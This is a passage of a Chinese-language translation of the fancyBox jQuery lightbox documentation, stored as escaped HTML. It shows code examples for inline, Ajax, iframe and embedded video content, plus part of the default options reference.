class=\"hljs-string\"\u003e\"thumbnail.jpg\"\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/gXMxJj?editors=1000\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003efancyBox 还支持禁止右键下载来保护图片。当然这无法阻止那些下定决心下载的用户，但是可以让大多数想要盗取你文件的用户打消这个念头。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e$(\u003cspan class=\"hljs-string\"\u003e'[data-fancybox]'\u003c/span\u003e).fancybox({\n  \u003cspan class=\"hljs-attr\"\u003eprotect\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/rYLGBe\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e4.2 行内 HTML\u003c/h3\u003e\n\u003cp\u003e对于行内元素，你需要创建一个隐藏的元素并添加独特的 \u003ccode\u003eid\u003c/code\u003e 属性：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003estyle\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"display: none;\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"hidden-content\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u0009\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh2\u003c/span\u003e\u0026gt;\u003c/span\u003eHello\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh2\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u0009\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e\u0026gt;\u003c/span\u003eYou are awesome.\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后只需要创建一个带有 \u003ccode\u003edata-src\u003c/code\u003e 属性的超链接，该属性值匹配之前隐藏元素的id（优先使用# ）：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-fancybox\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-src\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"#hidden-content\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"javascript:;\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u0009Trigger the fancyBox\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/OOXxLa\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e这段代码会产生一个关闭按钮（如果你没有通过 \u003ccode\u003esmallBtn: false\u003c/code\u003e 禁用的话），这个按钮只设置了居中。因此你可以很轻松地通过css来自定义样式。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e4.3 Ajax\u003c/h3\u003e\n\u003cp\u003e想要通过 Ajax 加载内容，需要在超链接添加 \u003ccode\u003edata-type=\"ajax\"\u003c/code\u003e 属性：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-fancybox\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-type\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"ajax\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-src\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"my_page.com/path/to/ajax/\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"javascript:;\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u0009AJAX content\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/qVNPEX?editors=1100\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e另外，可以使用 \u003ccode\u003edata-filter\u003c/code\u003e 属性定义一个选择器，来显示响应的一部分。这个选择器需要是一个合法的 jQuery 选择器：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-fancybox\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-type\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"ajax\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-src\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"my_page.com/path/to/ajax/\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-filter\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"#two\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"javascript:;\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u0009AJAX content\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/QOEqwe?editors=1100\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e4.4 Iframe\u003c/h3\u003e\n\u003cp\u003e如果内容可以展示在页面，并且放在 iframe 中不会被脚本或者安全策略禁止，它就可以在 fancyBox 中展示：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-fancybox\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-type\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"iframe\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-src\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"http://codepen.io/fancyapps/full/jyEGGG/\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"javascript:;\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u0009Webpage\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-fancybox\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-type\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"iframe\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-src\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"https://mozilla.github.io/pdf.js/web/viewer.html\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"javascript:;\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u0009Sample PDF\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/dZXVoJ?editors=1000\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e如果嵌入了 iframe，可以从父容器中访问和控制 fancyBox：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 根据内容调整 iframe 的高度\u003c/span\u003e\nparent.jQuery.fancybox.getInstance().update();\n\n\u003cspan class=\"hljs-comment\"\u003e// 关闭当前的 fancyBox 实例\u003c/span\u003e\nparent.jQuery.fancybox.getInstance().close();\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eIframe 尺寸可以通多 CSS 调整：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\" lang=\"css\"\u003e\u003cspan class=\"hljs-selector-class\"\u003e.fancybox-slide--iframe\u003c/span\u003e \u003cspan class=\"hljs-selector-class\"\u003e.fancybox-content\u003c/span\u003e {\n\u0009\u003cspan class=\"hljs-attribute\"\u003ewidth  \u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e800px\u003c/span\u003e;\n\u0009\u003cspan class=\"hljs-attribute\"\u003eheight \u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e600px\u003c/span\u003e;\n\u0009\u003cspan class=\"hljs-attribute\"\u003emax-width  \u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e80%\u003c/span\u003e;\n\u0009\u003cspan class=\"hljs-attribute\"\u003emax-height \u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e80%\u003c/span\u003e;\n\u0009\u003cspan class=\"hljs-attribute\"\u003emargin\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果需要的话，CSS 样式可以被 JS 覆盖：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e$(\u003cspan class=\"hljs-string\"\u003e\"[data-fancybox]\"\u003c/span\u003e).fancybox({\n\u0009\u003cspan class=\"hljs-attr\"\u003eiframe\u003c/span\u003e : {\n\u0009\u0009\u003cspan class=\"hljs-attr\"\u003ecss\u003c/span\u003e : {\n\u0009\u0009\u0009\u003cspan class=\"hljs-attr\"\u003ewidth\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'600px'\u003c/span\u003e\n\u0009\u0009}\n\u0009}\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果你没有禁止 iframe 的预加载（使用\u003ccode\u003epreload\u003c/code\u003e），那么fancyBox会尝试计算内容的尺寸，并且会根据内容来调整 iframe 的宽高。注意，这依赖于\u003ca target=\"_blank\" href=\"https://en.wikipedia.org/wiki/Same-origin_policy\"\u003e同源策略\u003c/a\u003e，因此会有一些限制。\u003c/p\u003e\n\u003cp\u003e下面这个例子禁止了 iframe 的预加载，并且用取消按钮代替了工具栏。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e$(\u003cspan class=\"hljs-string\"\u003e'[data-fancybox]'\u003c/span\u003e).fancybox({\n\u0009\u003cspan class=\"hljs-attr\"\u003etoolbar\u003c/span\u003e  : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n\u0009\u003cspan class=\"hljs-attr\"\u003esmallBtn\u003c/span\u003e : \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n\u0009\u003cspan class=\"hljs-attr\"\u003eiframe\u003c/span\u003e : {\n\u0009\u0009\u003cspan class=\"hljs-attr\"\u003epreload\u003c/span\u003e : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n\u0009}\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/rYLGeM?editors=1010\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e5. 嵌入\u003c/h2\u003e\n\u003cp\u003e支持的网站可以展示在 fancyBox 中，只需要提供页面的地址即可：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-fancybox\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"https://www.youtube.com/watch?v=_sI_Ps7JSEk\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  YouTube video\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-fancybox\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"https://vimeo.com/191947042\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  Vimeo video\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-fancybox\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"https://www.google.com/maps/search/Empire+State+Building/\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u0009Google Map\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-fancybox\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"https://www.instagram.com/p/BNXYW8-goPI/?taken-by=jamesrelfdyer\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-caption\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"\u0026lt;span title=\u0026amp;quot;Edited\u0026amp;quot;\u0026gt;balloon rides at dawn ✨🎈\u0026lt;br\u0026gt;was such a magical experience floating over napa valley as the golden light hit the hills.\u0026lt;br\u0026gt;\u0026lt;a href=\u0026amp;quot;https://www.instagram.com/jamesrelfdyer/\u0026amp;quot;\u0026gt;@jamesrelfdyer\u0026lt;/a\u0026gt;\u0026lt;/span\u0026gt;\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u0009Instagram photo\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/zPBEBN?editors=1000\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e5.1 视频尺寸\u003c/h3\u003e\n\u003cp\u003e通过 CSS 调整视频的显示大小：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e.fancybox-slide--video .fancybox-content {\n\u0009\u003cspan class=\"hljs-attr\"\u003ewidth\u003c/span\u003e  : \u003cspan class=\"hljs-number\"\u003e800\u003c/span\u003epx;\n\u0009height : \u003cspan class=\"hljs-number\"\u003e600\u003c/span\u003epx;\n\u0009max-width  : \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e%;\n\u0009max-height : \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e%;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/YEWrWL?editors=1100\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e显然，你可以选择你喜欢的尺寸。部分未支持的画面比例，可以\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/NgKNRz?editors=1010\"\u003e参照这个方法\u003c/a\u003e。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e5.2 视频参数\u003c/h3\u003e\n\u003cp\u003e通过 url 中的参数控制视频\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-fancybox\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"https://www.youtube.com/watch?v=_sI_Ps7JSEk\u0026amp;amp;autoplay=1\u0026amp;amp;rel=0\u0026amp;amp;controls=0\u0026amp;amp;showinfo=0\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  YouTube video - hide controls and info\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-fancybox\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"https://vimeo.com/191947042?color=f00\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  Vimeo video - custom color\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"http://codepen.io/fancyapps/pen/ooLGzE?editors=1000\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e通过 JavaScript 控制视频：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e$(\u003cspan class=\"hljs-string\"\u003e'[data-fancybox]'\u003c/span\u003e).fancybox({\n\u0009\u003cspan class=\"hljs-attr\"\u003eyoutube\u003c/span\u003e : {\n\u0009\u0009\u003cspan class=\"hljs-attr\"\u003econtrols\u003c/span\u003e : \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e,\n\u0009\u0009\u003cspan class=\"hljs-attr\"\u003eshowinfo\u003c/span\u003e : \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u0009},\n\u0009\u003cspan class=\"hljs-attr\"\u003evimeo\u003c/span\u003e : {\n\u0009\u0009\u003cspan class=\"hljs-attr\"\u003ecolor\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'f00'\u003c/span\u003e\n\u0009}\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"http://codepen.io/fancyapps/pen/xPOXRL?editors=1010\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e6. 选项\u003c/h2\u003e\n\u003cp\u003e默认选项值快速参考：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e defaults = {\n\n    \u003cspan class=\"hljs-comment\"\u003e// 相册循环浏览\u003c/span\u003e\n    loop : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 图片周围的margin，如果视口（viewport）宽度小于800px则忽略\u003c/span\u003e\n    margin : [\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e],\n\n    \u003cspan class=\"hljs-comment\"\u003e// Horizontal space between slides\u003c/span\u003e\n    gutter : \u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 键盘浏览\u003c/span\u003e\n    keyboard : \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 是否在屏幕边缘显示箭头\u003c/span\u003e\n    arrows : \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 是否显示infobar (顶部的counter and arrows)\u003c/span\u003e\n    infobar : \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 是否显示顶部的toolbar\u003c/span\u003e\n    toolbar : \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 控制顶部toolbar里显示的图表\u003c/span\u003e\n  \u0009\u003cspan class=\"hljs-comment\"\u003e// 通过`btnTpl`选项的模板创建按钮，并被放置在toolbar(class=\"fancybox-toolbar\"`的元素)中\u003c/span\u003e\n    buttons : [\n        \u003cspan class=\"hljs-string\"\u003e'slideShow'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'fullScreen'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'thumbs'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'share'\u003c/span\u003e,\n        \u003cspan class=\"hljs-comment\"\u003e//'download',\u003c/span\u003e\n        \u003cspan class=\"hljs-comment\"\u003e//'zoom',\u003c/span\u003e\n        \u003cspan class=\"hljs-string\"\u003e'close'\u003c/span\u003e\n    ],\n\n    \u003cspan class=\"hljs-comment\"\u003e// 探测\"idle\"的时间(秒)\u003c/span\u003e\n    idleTime : \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 是否在右上角显示关闭按钮\u003c/span\u003e\n  \u0009\u003cspan class=\"hljs-comment\"\u003e// 如果设置为'auto',遇到内容类型为html,inline,ajax时显示\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// Use template from `btnTpl.smallBtn` for customization\u003c/span\u003e\n    smallBtn : \u003cspan class=\"hljs-string\"\u003e'auto'\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 保护文件，禁止右键下载\u003c/span\u003e\n    protect : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// Shortcut to make content \"modal\" - 禁止键盘浏览，隐藏按钮等\u003c/span\u003e\n    modal : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-attr\"\u003eimage\u003c/span\u003e : {\n      \u0009\u003cspan class=\"hljs-comment\"\u003e// 预加载\u003c/span\u003e\n      \u0009\u003cspan class=\"hljs-comment\"\u003e// 需要预定义图片的尺寸\u003c/span\u003e\n      \u0009\u003cspan class=\"hljs-comment\"\u003e// 设置为'auto'，自动在预览图中缩放\u003c/span\u003e\n        preload : \u003cspan class=\"hljs-string\"\u003e\"auto\"\u003c/span\u003e\n\n    },\n\n    \u003cspan class=\"hljs-attr\"\u003eajax\u003c/span\u003e : {\n\n        \u003cspan class=\"hljs-comment\"\u003e// 请求 ajax 的配置\u003c/span\u003e\n        settings : {\n          \u0009\u003cspan class=\"hljs-comment\"\u003e// 表明请求是从模态框中发起，名字可改\u003c/span\u003e\n            data : {\n                \u003cspan class=\"hljs-attr\"\u003efancybox\u003c/span\u003e : \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n            }\n        }\n\n    },\n\n    \u003cspan class=\"hljs-attr\"\u003eiframe\u003c/span\u003e : {\n\n        \u003cspan class=\"hljs-comment\"\u003e// Iframe 模板\u003c/span\u003e\n        tpl : \u003cspan class=\"hljs-string\"\u003e'\u0026lt;iframe id=\"fancybox-frame{rnd}\" name=\"fancybox-frame{rnd}\" class=\"fancybox-iframe\" frameborder=\"0\" vspace=\"0\" hspace=\"0\" webkitAllowFullScreen mozallowfullscreen allowFullScreen allowtransparency=\"true\" src=\"\"\u0026gt;\u0026lt;/iframe\u0026gt;'\u003c/span\u003e,\n\n        \u003cspan class=\"hljs-comment\"\u003e// 预加载\u003c/span\u003e\n        \u003cspan class=\"hljs-comment\"\u003e// 由于同源策略，不能加载跨域数据\u003c/span\u003e\n        preload : \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n\n      \u0009\u003cspan class=\"hljs-comment\"\u003e// 自定义包裹 iframe 的元素的 CSS 样式\u003c/span\u003e\n      \u0009\u003cspan class=\"hljs-comment\"\u003e// 这样就可以自定义 iframe 的尺寸\u003c/span\u003e\n        css : {},\n\n        \u003cspan class=\"hljs-comment\"\u003e// iframe 标签属性\u003c/span\u003e\n        attr : {\n            \u003cspan class=\"hljs-attr\"\u003escrolling\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'auto'\u003c/span\u003e\n        }\n\n    },\n\n    \u003cspan class=\"hljs-comment\"\u003e// 如果内容类型不能自动检测出来，默认值为'image'\u003c/span\u003e\n    defaultType : \u003cspan class=\"hljs-string\"\u003e'image'\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 打开/关闭动画类型\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 可用的值:\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//   false            - disable\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//   \"zoom\"           - zoom images from/to thumbnail\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//   \"fade\"\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//   \"zoom-in-out\"\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\n    animationEffect : \u003cspan class=\"hljs-string\"\u003e\"zoom\"\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 打开/关闭动画使用的时间，ms\u003c/span\u003e\n    animationDuration : \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 图片缩放时是够改变透明度\u003c/span\u003e\n  \u0009\u003cspan class=\"hljs-comment\"\u003e// 如果透明度为'auto'，那么图片和缩略图比例不一致时透明度将会发生改变\u003c/span\u003e\n    zoomOpacity : \u003cspan class=\"hljs-string\"\u003e\"auto\"\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 滑块动画\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 可用的值:\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//   false            - disable\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//   \"fade'\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//   \"slide'\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//   \"circular'\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//   \"tube'\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//   \"zoom-in-out'\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//   \"rotate'\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\n    transitionEffect : \u003cspan class=\"hljs-string\"\u003e\"fade\"\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 动画持续时间，ms\u003c/span\u003e\n    transitionDuration : \u003cspan class=\"hljs-number\"\u003e366\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 自定义的滑块的 class 值\u003c/span\u003e\n    slideClass : \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,\n\n    